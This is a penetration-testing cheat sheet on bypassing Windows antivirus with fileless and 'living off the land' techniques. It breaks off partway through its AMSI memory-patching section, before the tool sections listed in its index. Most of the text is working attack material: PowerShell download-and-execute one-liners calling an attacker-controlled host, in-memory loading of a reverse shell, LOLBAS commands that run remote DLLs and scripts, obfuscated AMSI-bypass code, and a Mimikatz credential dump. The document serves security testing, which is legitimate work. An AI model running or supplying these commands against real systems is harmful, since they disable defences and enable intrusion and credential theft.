===================================================================================================================================================
AV bypass using 'Living Off The Land' and fileless techniques
===================================================================================================================================================

INDEX
======

I.   Reminder & Definitions
     ➤ Why using 'Living Off The Land' and fileless techniques?
     ➤ Microsoft Antimalware Scan Interface (AMSI)
     ➤ Windows security features and Microsoft security products

II.  Basic examples of 'Living Off The Land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts) 

III. Basic examples of 'Living Off The Land' techniques using LOLBAS (i.e. Living Off The Land Binaries, Scripts and Libraries)
     ➤ 'Rundll32.exe', 'Pcalua.exe', 'Remote.exe', 'Regsvr32.exe', 'Wscript.exe', etc.

IV.  AMSI bypass techniques to be able to load & execute straight in-memory offensive tools without being detected by Antivirus
     ➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
     ➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory 
     ➤ AMSI bypass technique 3 - Modify a Windows registry key to disable the AMSI (admin priv required)
     ➤ AMSI bypass technique 4 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
     ➤ AMSI bypass technique 5 - AMSI dll hijacking

V.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive .Net assemblies

VI.  Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files


===================================================================================================================================================
I. Reminder & Definitions
===================================================================================================================================================

-----------------------------------------------------------------
1.1 Why using 'living off the land and fileless' techniques ?
-----------------------------------------------------------------
> The purpose of the 'living off the land' and fileless techniques is to avoid getting detected and blocked by the antivirus and 
  end-point protection solutions installed on modern Windows machines during penetration tests by:
  - running scripts, portable executable files and shellcodes directly into memory  
  - using as much as possible legitimate sysadmin tools and software that are already installed on the target computers.
  
  The four main categories of living off the land and fileless attack techniques are: 
  - memory-only threats, 
  - fileless persistence, 
  - dual-use tools,
  - non-PE file attacks.

  In general, creating less new files on the hard disk means less chance of being detected by traditional security tools (i.e. AV) 
  and therefore minimizes the risk of an attack being detected and blocked.

  During a penetration test, before executing directly into memory a PowerShell script, a shellcode or a portable executable file 
  (using the reflective PE-Loading technique) on a modern Windows system it is recommended to disable the Antimalware Scan Interface (AMSI)
  to avoid our script, shellcode or PE file being scanned and potentially blocked by the AV installed on the Windows system.

---------------------------------------------------------------------------------------------------------------------------------------------------
1.2 Microsoft Antimalware Scan Interface (AMSI)
---------------------------------------------------------------------------------------------------------------------------------------------------
> The Microsoft Antimalware Scan Interface (AMSI) provides enhanced malware protection by allowing the Antivirus solution installed 
  on a modern Windows computer (i.e. Windows 10/11 or Windows server 2016/2019/2022) to scan the applications and scripts before they
  are executed. 
  For instance, the AMSI feature is integrated into these components when they are executed:
  - User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
  - PowerShell greater than 2.0 (scripts, interactive use, and dynamic code evaluation)
  - Windows Script Host (wscript.exe and cscript.exe)
  - JavaScript and VBScript
  - Office VBA macros
  - .NET Framework
  - Windows Management Instrumentation (WMI)

> The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows the applications and services to integrate
  with any antimalware product
  that's present on a Windows machine (e.g. Microsoft Defender AntiVirus is enabled by default on Windows 10/11).
  AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided
  by today's antimalware products that can be integrated into applications. 
  
> The AMSI protects PowerShell by loading AMSI’s DLL (amsi.dll) into the PowerShell’s memory space.
  It scans the PowerShell console input by using Microsoft Defender (or other AV) to determine whether to block the payload operation or 
  allow it to continue.
  Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.
  - AmsiScanBuffer()
  - AmsiScanString()

> There are many techniques to bypass AMSI such as:
  - patching the amsi.dll in memory
  - setting the “amsiInitFailed” flag to prevent AMSI scanning capability for the current process (the strings 'AmsiUtils' & 'amsiInitFailed'
    are encoded to avoid the AV to detect and block the AMSI bypass)
  - forcing an error i.e. forcing the AMSI initialization to fail (amsiInitFailed) so no scan will be initiated for the current process
  - placing a separate amsi.dll in the current working directory (note: legacy technique)
  - Windows registry key modification
  The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result and not being flagged as “malicious”. 

  Usefull links:
  - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
  - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
  - https://amsi.fail
  - https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/
  - etc.
  
---------------------------------------------------------------------------------------------------------------------------------------------------
1.3 Windows security features and Microsoft security products
---------------------------------------------------------------------------------------------------------------------------------------------------
> PowerShell security features
  Microsoft has added some security features in PowerShell v5 to help out the Blue teams such as: 
  - Constrained Language Mode
    It is a setting in PowerShell that greatly limits what commands can be performed. This can potentially reduce the available attack
    surface to adversary's. 
  - Deep Script Block Logging
    It records block of code as they are executed therefore it captures the complete activity and full content of the script. 
    It maintains the complete audit trail of each activity which can be used later in forensics and to study the malicious behavior. 
    It records all the activity at time of execution thus provides the complete details.
    Everytime an adversary executes an encoded PowerShell script or command, script block logging provides that data in its raw form.
  - System-Wide Transcripts
    It creates a record of all or part of a PowerShell session to a text file. 
    The transcript includes all command that the user types and all output that appears on the console.
  - Antimalware Scan Interface (AMSI)  
  - ...

> Microsoft Defender AV
  - Real-Time protection and Antimalware Scan Interface (AMSI) 
  - Automatic and manual scanning
  - Tamper protection (prevents other form tampering with important security features)
  - Sample submissions
  - ...

> Software whitelisting using AppLocker 
  - AppLocker is an application whitelisting technology introduced with Microsoft's Windows 7 OS. It allows restricting which 
    programs users can execute based on the program's path, publisher, or hash, and in an enterprise can be configured via GPO.
  - AppLocker can control the following file types: Executables, DLLs, Scripts, Windows Installers, Packaged apps and installers.
  - AppLocker supports Windows 10/11 and Windows server 2016 and above.
  Note: Microsoft Software Restriction Policy (SRP) can still be used but is "deprecated". AppLocker is recommended for supported 
        Windows OS.
  
> Windows Event Tracing (ETW) 
  - ETW provides a way to trace and log events from both user and kernel mode. 
  - It is used by AV and EDR to detect attacks.
  
> LSASS & Protected Process Light (PPL)
  - On Windows the Local Security Authority Subsystem is responsible for safeguarding the NTLM hashes, Kerberos tickets and anything 
    that has to do with authentication and authorization.
  - To prevent the bad guys from stealing credentials, a security feature called LSA (Local Security Authority) Protection Light was 
    introduced.
  - RunAsPPL for LSASS is a true quick win. It is very easy to configure as the only thing you have to do is add a simple value in 
    the registry and reboot. Like any other protection though, it is not bulletproof and it is not sufficient on its own, but it is 
    still particularly efficient. Attackers will have to use some relatively advanced tricks if they want to work around it, which 
    ultimately increases their chance of being detected.
    
> Microsoft Defender Credential Guard 
  - It uses virtualization-based security to isolate secrets so that only privileged system software can access them. 
    Unauthorized access to these secrets can lead to credential theft attacks, such as Pass-the-Hash or Pass-The-Ticket. 
    Microsoft Defender Credential Guard prevents these attacks by protecting NTLM password hashes, Kerberos Ticket Granting Tickets, 
    and credentials stored by applications as domain credentials.
  - By enabling Microsoft Defender Credential Guard, the following features and solutions are provided:
    + Hardware security NTLM, Kerberos, and Credential Manager take advantage of platform security features, including Secure Boot 
      and virtualization, to protect credentials.
    + Virtualization-based security Windows NTLM and Kerberos derived credentials and other secrets run in a protected environment 
      that is isolated from the running operating system.
    + Better protection against advanced persistent threats When Credential Manager domain credentials, NTLM, and Kerberos derived 
      credentials are protected using virtualization-based security, the credential theft attack techniques and tools used in many 
      targeted attacks are blocked. Malware running in the operating system with administrative privileges cannot extract secrets 
      that are protected by virtualization-based security.

> Microsoft Defender for Endpoint (formerly known as Microsoft Defender Advanced Threat Protection (ATP))
  - It is an EDR that detects and remediates advanced attacks on endpoints. 
  - It is a post-breach solution that complements Microsoft Defender AV.
  
> The Windows Lockdown Policy (WLDP aka Device Guard) 
  - It checks the digital signature of dynamic code.


===================================================================================================================================================
II.  Basic examples of 'Living off the land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts)
===================================================================================================================================================

PowerShell is built on .NET and it natively allows to download and execute straight into memory:
> PowerShell scripts
> .Net Assemblies (PE and DLL)
  Examples
   > Method 1 - Add assembly with Add-Type cmdletPermalink
   > Method 2 - Add assembly with Reflection Assembly
   > Method 3 - Add assembly via a string objectPermalink

In addition, with PowerShell, we can also download and execute straight into memory any Windows PE and DLL by using the reflective 
PE/DLL injection methods.

---------------------------------------------------------------------------------------------------------------------------------------------------
2.1. How to download and execute straight into memory a PowerShell script hosted remotely on a Web server
---------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\temp> powershell -exec bypass
PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://YOUR_IP_ADDRESS/PowerShell-Script.ps1'); PoSH-script-function-name
- OR -
PS C:\temp> powershell -exec bypass
PS C:\temp> $payload = 'http://Your-IP-address/PowerShell-Script.ps1'
PS C:\temp> IEX (New-Object Net.WebClient).DownloadString($payload);
- OR -
C:\temp> echo IEX(New-Object Net.WebClient).DownloadString('http://Your-IP-address/PowerShell-Script.ps1') | powershell -noprofile - 
- OR -
C:\temp> powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
         iwr('http://Your-IP-address/PowerShell-Script.ps1')|iex"

---------------------------------------------------------------------------------------------------------------------------------------------------
2.2. How to download and execute straight into memory a ".Net" executable using PowerShell
---------------------------------------------------------------------------------------------------------------------------------------------------

PoC with the tool "SharUP.exe" (C# - SharpUp.csproj)
- - - - - - - - - - - - - - - - - - - - - - - - - - -
PS C:\temp> $PEtoload = (New-Object System.Net.WebClient).DownloadData('http://192.168.13.154:8081/SharpUp.exe')

PS C:\temp> $assembly = [System.Reflection.Assembly]::Load($PEtoload);
PS C:\temp> $entryPointMethod = $assembly.GetType('SharpUp.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('audit', '')));

=== SharpUp: Running Privilege Escalation Checks ===
[*] Already in high integrity, no need to privesc!
[*] Audit mode: running an additional 0 check(s).
[*] Note: Running audit mode in high integrity will yield a large number of false positives.
[-] Not vulnerable to any of the 0 checked modules.
[*] Completed Privesc Checks in 0 seconds


PoC with a reverseshell "revshell.exe" (C#)
- - - - - - - - - - - - - - - - - - - - - - - - - - -
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.13.154:8081/revshell.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())


---------------------------------------------------------------------------------------------------------------------------------------------------
2.3. How to download and execute straight into memory a ".NET" DLL using PowerShell
---------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/MyLibrary.dll')
PS C:\temp> $assem = [System.Reflection.Assembly]::Load($data)
PS C:\temp> $class = $assem.GetType("MyLibrary.Class1")
PS C:\temp> $method = $class.GetMethod("AwesomeFunctionName")
PS C:\temp> $method.Invoke(0, $null)

(note : https://github.com/crypt0jan/ClassLibrary1)

OR

+ Step 1 - Get a Base64 encoded string of the DLL
PS C:\temp> [convert]::ToBase64String((Get-Content -path "C:\PATH\MyLibrary.dll" -Encoding byte))

+ Step 2 - Embed assembly string in script 
PS C:\temp> $dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAA...'
PS C:\temp> $bytes = [System.Convert]::FromBase64String($dll)
PS C:\temp> [System.Reflection.Assembly]::Load($bytes)


===================================================================================================================================================
III. Basic examples of 'Living off the land' techniques using LOLBAS (i.e. Living Off The Land Binaries, Scripts and Libraries)
===================================================================================================================================================

The goal of the 'LOLBAS' project is to document every binary, script, and library that can be used for 'Living Off The Land' techniques.

=> https://lolbas-project.github.io/#
=> https://github.com/LOLBAS-Project/LOLBAS#criteria
=> http://malcommands.com/


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ Example of LOLBAS n°1 - Rundll32.exe (Allow to execute remote dll files)
---------------------------------------------------------------------------------------------------------------------------------------------------

Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute 
(i.e. execute DLL from SMB share.)

=> rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint


Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site 
(i.e. execute code from Internet)

=> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run
                ("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ Example of LOLBAS n°2 - Pcalua.exe (Program Compatibility Assistant - Allow to execute remote exe/dll files)
---------------------------------------------------------------------------------------------------------------------------------------------------

Execute a target binary (.EXE) or DLL using the Program Compatibility Assistant. 
A pop-up will appear and ask us to confirm the execution of the binary or DLL remotely hosted on a share. 

=> C:\Windows\System32\pcalua.exe -a \\server\payload.dll
=> C:\Windows\System32\pcalua.exe -a \\server\payload.exe

Note: In general, the remote binary is executed in a new windows and exit as soon as the execution is finished.


PoC with the hacking tool "Mimikatz" (obfuscated with the packer 'inceptor') on a Windows laptop protected by Windows Defender AV
---------------------------------------------------------------------------------------------------------------------------------

PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,
            AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/8/2025 4:35:53 PM


PS C:\Temp> C:\Windows\system32\pcalua.exe -a "\\192.168.1.254\files\Packed-Mimi.exe"

=> A Windows box message pops-up and ask us to confirm the execution of our malicious tool. I clicked on the button "Run".
 
"Open File - Security Warning
We can't verify who created this file. Are yous sure you want to run this file ?

Name: \\192.168.1.254\files\Packed-Mimi.exe
Type: Application
From: \\192.168.1.254\files\Packed-Mimi.exe

Run button | Cancel button
"

=> Then a second Windows pops-up executing my packed/obfuscated version of Mimikatz: 

[+] Success. amsi.dll Patched!
[*] Restoring memory protection...

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz #


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ Example of LOLBAS n°3 - Remote.exe (Debugging tool included with Windows Debugging Tools - Allow to execute remote exe files)
---------------------------------------------------------------------------------------------------------------------------------------------------

It is Debugging tool included with Windows Debugging Tools that can be used to execute a remote binary without saving file to disk.

=> C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere

PoC with the hacking tool "PassTheCert" on a Windows computer protected by Windows Defender AV
----------------------------------------------------------------------------------------------

C:\Temp>remote.exe /s "\\192.168.1.254\files\Pass-The-Cert.exe --help" anythinghere
**************************************
***********     REMOTE    ************
***********     SERVER    ************
**************************************
To Connect: Remote /C PO744653 "anythinghere"

PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] 
                (--elevate|--rbcd|--add-computer|--set-spn|--reset-password|--add-account-to-group) [ATTACK_OPTIONS]
GENERAL OPTIONS:
        --server DOMAIN_CONTROLLER
                Domain controller to connect to. By default, connection will be done over TCP/636 (LDAPS).
        --start-tls
                Indicates that connection should instead be done over TCP/389 (LDAP) and then use StartTLS.
        --cert-path CERT_PATH
                Path to the certificate to authenticate with.
        --cert-password CERT_PASSWORD
                Password to the certificate (Optional argument. Default value: <empty>).
<SNIP>

Remote exiting. Child (\\192.168.1.254\Disque dur\Pass-The-Cert.exe --help) exit code was 0.

C:\Temp>


It can also be used to launch PowerShell...
=> C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\Remote.exe /s "powershell.exe" anythinghere


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ Example of LOLBAS n°4 - Regsvr32.exe (Allow to execute remote dll files)
---------------------------------------------------------------------------------------------------------------------------------------------------

Execute the specified remote .SCT script with scrobj.dll.

=> C:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct scrobj.dll
=> C:\Windows\SysWOW64\regsvr32.exe /s /n /u /i:http://example.com/file.sct scrobj.dll


Example of a ".SCT" file that executes "calc.exe":
--------------------------------------------------
	<?XML version="1.0"?>
	<scriptlet>
	<registration 
	    progid="awl_bypass"
	    classid="{A1112221-0000-0000-0000-000DA00DACDC}" >
	        <script language="JScript">
	                <![CDATA[var r = new ActiveXObject("WScript.Shell").Run("calc.exe");]]>
		</script>
	</registration>
	</scriptlet>


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ Example of LOLBAS n°5 - Wscript.exe (Allow to execute remote scripts files)
---------------------------------------------------------------------------------------------------------------------------------------------------

Execute hidden code to evade defensive counter measures by downloading a remote script and storing it in an alternate data stream.

=> echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") 
     > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js



===================================================================================================================================================
IV.  AMSI bypass techniques to be able to load & execute straight in-memory offensive tools without being detected by Antivirus
===================================================================================================================================================

It exists many AMSI bypass techniques. Below are just a few classic examples.

---------------------------------------------------------------------------------------------------------------------------------------------------
➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
---------------------------------------------------------------------------------------------------------------------------------------------------

By forcing the AMSI initialization to fail (amsiInitFailed) no AMSI scan will be initiated for the current powershell process.

=> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
=> https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
=> http://amsi.fail

--------------------------------------------------------------------
PoC 1 - AMSI bypass test on a Windows Server 2022 (with Defender AV)
--------------------------------------------------------------------

┌──(auditor㉿kali)-[~]
└─$ evil-winrm -i 192.168.1.11 -u administrator -p <snip>

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> $PSversiontable

Name                           Value
----                           -----
PSVersion                      5.1.20348.2849
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.20348.2849
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1


*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
                                                  AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/2/2025 3:55:30 AM


*Evil-WinRM* PS C:\Users\Administrator\Documents> [Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" 
					          -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" 
						  -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" 
						  -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($0x00),0x41414141);


=> To verify that the AMSI has been successfully bypassed we can type the command "invoke-mimikatz" that should not been catched anymore by Microsoft Defender.
   Result : the command is not detected :-) 

*Evil-WinRM* PS C:\Users\Administrator\Documents> invoke-mimikatz
The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, 
verify that the path is correct and try again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

=> We can now download and execute any malicious scripts and tools such as the hacking tool 'Mimikatz' for this PoC.

*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/SuperMimiCustom.ps1');

*Evil-WinRM* PS C:\Users\Administrator\Documents> invoke-mimi-custom

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 195153 (00000000:0002fa51)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SERVER-WIN2022
Logon Server      : SERVER-WIN2022
Logon Time        : 5/2/2025 11:25:21 AM
SID               : S-1-5-21-3336774573-1234467604-3718094125-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SERVER-WIN2022
         * NTLM     : 6699270562fdbd1e74c7d369c<SNIP>
         * SHA1     : 62c9d420fbebe8aca4f082465<SNIP>
         * DPAPI    : 62c9d420fbebe8aca4f082465<SNIP>
        tspkg :

-------------------------------------------------------------------
PoC 2 - AMSI bypass test on a Windows 10 laptop (with Defender AV)
-------------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\pentester> $PSversiontable

Name                           Value
----                           -----
PSVersion                      5.1.19041.5737
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.5737
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1


PS C:\Users\pentester> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
		       AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/1/2025 6:27:04 AM


PS C:\Users\pentester> $JAyqn6s6=$null;$strnuz2n20=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076));$jmwijlxcxmaddpv="+[chAR](90+17)+[CHAr]([BYTe]0x64)+[Char]([BYTe]0x6f)+[ChaR]([bytE]0x61)
+[Char](108*104/104)+[CHAR](113*29/29)+[ChaR](104+89-89)+[CHar]([BYTe]0x6d)+[ChAR](103*65/65)+[cHaR]([BytE]0x71)+[CHAr]([bYte]0x66)+[ChAr]([BytE]0x61)+[ChaR]([Byte]0x77)+[ChaR](107+15-15)+[chaR]([bYte]0x74)";
[Threading.Thread]::Sleep(1250);[Ref].Assembly.GetType("System.$([char](19+58)+[ChAR](97+62-62)+[cHar](110)+[CHar](97)+[chaR](103*20/20)+[chAr]([bYTE]0x65)+[CHAr](109*43/43)+
[chAr](101)+[cHar](82+28)+[ChAR]([BYTe]0x74)).$([cHaR]([bytE]0x41)+[chAr](53+64)+[chaR]([bYte]0x74)+[cHar](79+32)+[cHaR]([ByTe]0x6d)+[ChaR](97)+
[chAr]([bYTe]0x74)+[chaR]([BYTe]0x69)+[cHaR]([BYte]0x6f)+[cHAr](110)).$([cHAR]([BYtE]0x41)+[CHaR]([ByTE]0x6d)+[CHAr](5+110)+[cHar]([BYTE]0x69)+[ChAR](85+27-27)+[ChAR]([BYTe]0x74)+[ChAR]([bYTE]0x69)+
[ChaR]([ByTE]0x6c)+[chAr](17+98))").GetField("$(('ämsíSèssî'+'ôn').noRMalIZe([ChAr](70)+[chAR](111*10/10)+[ChaR](114)+[CHaR](109+88-88)+[cHAR](68)) 
-replace [ChAR](92+68-68)+[ChaR](112*49/49)+[chAr](123+75-75)+[chAr]([bYTe]0x4d)+[ChaR](37+73)+[cHAR]([bYtE]0x7d))", 
"NonPublic,Static").SetValue($JAyqn6s6, $JAyqn6s6);[Ref].Assembly.GetType("System.$([char](19+58)+[ChAR](97+62-62)+[cHar](110)+[CHar](97)+[chaR](103*20/20)+[chAr]([bYTE]0x65)+[CHAr](109*43/43)+[chAr](101)+
[cHar](82+28)+[ChAR]([BYTe]0x74)).$([cHaR]([bytE]0x41)+[chAr](53+64)+[chaR]([bYte]0x74)+[cHar](79+32)+[cHaR]([ByTe]0x6d)+[ChaR](97)+[chAr]([bYTe]0x74)+[chaR]([BYTe]0x69)+
[cHaR]([BYte]0x6f)+[cHAr](110)).$([cHAR]([BYtE]0x41)+[CHaR]([ByTE]0x6d)+[CHAr](5+110)+[cHar]([BYTE]0x69)+[ChAR](85+27-27)+[ChAR]([BYTe]0x74)+[ChAR]([bYTE]0x69)+
[ChaR]([ByTE]0x6c)+[chAr](17+98))").GetField("$([cHaR]([bYte]0x61)+[ChaR]([byTE]0x6d)+[chAR]([ByTE]0x73)+[CHaR]([BYte]0x69)+[CHAr](11+56)+[chAr]([bYtE]0x6f)+
[CHAr](110*90/90)+[ChAr]([bYTE]0x74)+[cHAr]([BYTe]0x65)+[chaR](21+99)+[ChAr](62+54))", "NonPublic,Static").SetValue($JAyqn6s6, [IntPtr]$strnuz2n20);$phlxvsitgqbxld="";[Threading.Thread]::Sleep(79)                                                                                                                                                                    

PS C:\Users\pentester>

=> To verify that the AMSI has been successfully bypassed we can type the command "invoke-mimikatz" that should not been catched anymore by Microsoft Defender.
   Result : the command is not detected :-) 

PS C:\Users\pentester> invoke-mimikatz                                                                                                                          
invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, 
or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\pentester>

=> We can now download and execute any malicious scripts and tools such as the hacking script 'PowerUp' for this PoC.

PS C:\Users\pentester> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks              
[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.

<SNIP>


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory 
---------------------------------------------------------------------------------------------------------------------------------------------------

There are multiple blogs and GitHub projects that share example of code to patch the AMSI.dll in memory.

=> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
=> https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
=> http://amsi.fail

-------------------------------------------------------------------------------------------------------------------------
PoC n°1 - Windows Server 2022 (with Defender AV) - Test as a local administrator user logged with PowerShell remoting
-------------------------------------------------------------------------------------------------------------------------

To successfully patch the AMSI.dll in the PowerShell remoting session, I used a well known PowerShell script (containing C# code) that I obfuscated 
and splitted in 3 parts before loading it from a remote Web server. 
Doing so allowed me to execute my malicious script that patch the AMSI.dll without being blocked by the Microsoft Defender AV running on the Windows computer. 


┌──(auditor㉿kali)-[~]
└─$ evil-winrm -i 192.168.1.11 -u administrator -p <snip>

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> $PSversiontable

Name                           Value
----                           -----
PSVersion                      5.1.20348.2849
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.20348.2849
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1


*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
						  AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/2/2025 3:55:30 AM


*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/PatchingInMemory-part1.ps1');
*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/PatchingInMemory-part2.ps1');
True
